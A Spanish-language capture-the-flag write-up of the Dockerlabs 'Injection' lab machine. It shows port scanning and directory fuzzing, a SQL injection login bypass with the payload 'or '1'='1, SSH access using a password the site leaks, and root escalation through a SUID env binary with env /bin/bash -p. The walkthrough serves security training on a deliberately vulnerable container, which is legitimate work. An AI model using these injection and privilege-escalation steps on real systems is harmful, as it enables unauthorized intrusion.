---
title: "[ES] Writeup - Injection Dockerlabs"
date: 2025-04-12T00:00:00+00:00
tags: ["hacking", "spanish","cybersec","writeups","dockerlabs"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Un breve writeup de la máquina Injection de Dockerlabs"
---

Esta es una máquina de explotación trivial basada en una inyección SQL y escalada de privilegios gracias a archivos con el bit SUID.

Iniciamos la máquina mediante el auto_deploy:

``` bash
./auto_deploy.sh injection.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Sabemos que la IP es 172.17.0.2, vamos a realizar un escaneo de nmap:

``` bash
sudo nmap -sS -T4 -p- 172.17.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 17:27 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 6A:79:F6:CC:73:F2 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds

sudo nmap -sS -A -p 22,80,21 172.17.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 17:27 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000090s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open   http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
MAC Address: 6A:79:F6:CC:73:F2 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.09 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds

```

La versión del servidor SSH es demasiado alta como para ser vulnerable a enumeración de usuarios, así que comencare analizando el servicio web.

Primero de nada vamos a quitarnos de encima la posibilidad de subir una webshell mediante el verbo HTTP PUT:

``` bash
sudo nmap --script http-methods -p 80 172.17.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 17:29 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 6A:79:F6:CC:73:F2 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

```

Como esperabamos, no es un metodo permitido.

Pasemos a un fuzzing de directorios:

``` bash
feroxbuster --url http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html -x txt -x php -x git

                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt, php, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       95l      266w     2921c http://172.17.0.2/index.php
200      GET       95l      266w     2921c http://172.17.0.2/
200      GET        0l        0w        0c http://172.17.0.2/config.php
```

Index.php es de esperar, config.php es una página en blanco. Hay más cosas que podríamos hacer en una evaluación extensiva desde la terminal, pero como es una máquina sencilla voy a ver en el navegador la página index.php.

Se trata de una pagina de login, probemos admin:admin.

Error, recordando el nombre de la máquina intentemos la técnica de inyección SQL, es decir utilizemos las credenciales:

admin:'or '1'='1

Y efectivamente funciona.

Recibimos un mensaje diciendo:

``` bash
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

Podemos asumir que esto son credenciales ssh, probemoslas:

``` bash
ssh dylan@172.17.0.2

dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.13.6-arch1-1 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@f0113a690d25:~$ 
```

Fantastico, ahora solo hay que buscar una forma de ser root. Antes de subir cosas como LinPEAS vamos a mirar permisos sudo y archivos con el bit SUID:

``` bash
dylan@f0113a690d25:~$ sudo -l                                                        
-bash: sudo: command not found
dylan@f0113a690d25:~$ find / -type f -perm -4000 2>/dev/null                         
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/env
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Bien, vamos a ver en GTFObins cual de estos binarios nos permite escalar a root.

env es un buen candidato, según GTFObins podemos usar:

``` bash
./env /bin/sh -p
```

Pero no hay ningún motivo por el que no instanciariamos nuestra shell de root como bash:

``` bash
dylan@f0113a690d25:~$ env /bin/bash -p                                               
bash-5.1# whoami
root
```

Y listo! Máquina pwneada.
